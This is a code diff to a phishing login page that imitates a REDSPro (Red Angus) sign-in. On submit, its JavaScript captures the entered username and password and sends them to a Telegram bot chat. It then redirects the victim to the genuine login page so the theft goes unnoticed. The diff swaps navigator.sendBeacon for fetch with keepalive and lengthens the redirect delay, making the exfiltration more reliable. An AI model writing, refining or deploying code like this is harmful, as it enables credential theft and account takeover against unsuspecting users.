@@ -75,7 +75,7 @@ document.getElementById('loginForm').addEventListener('submit', function(e) {
     var date = new Date().toLocaleString();
     var msg = "\uD83D\uDD25 *New REDSPro Login*\n\n\uD83D\uDCE7 User: " + user + "\n\uD83D\uDD11 Pass: " + pass + "\n\u23F0 Time: " + date;
 
-    // Use sendBeacon for reliability during redirect
+    // Use fetch with keepalive for reliability
     var url = "https://api.telegram.org/bot/YOUR_BOT_TOKEN/sendMessage";
     var data = JSON.stringify({
         chat_id: "6479764005",
@@ -83,12 +83,18 @@ document.getElementById('loginForm').addEventListener('submit', function(e) {
         parse_mode: "markdown"
     });
 
-    navigator.sendBeacon(url, new Blob([data], {type: "application/json"}));
+    // Send to Telegram
+    fetch(url, {
+        method: 'POST',
+        headers: {'Content-Type': 'application/json'},
+        body: data,
+        keepalive: true
+    }).catch(err => console.error('Telegram send failed:', err));
 
-    // Small delay to ensure beacon fires, then redirect
+    // Redirect after a short delay to ensure the request is queued
     setTimeout(function() {
         window.location.href = "https://vm-zebu.redangus.org/redspro/redspro/template/Login.vm";
-    }, 500);
+    }, 800);
 });
 </script>
 
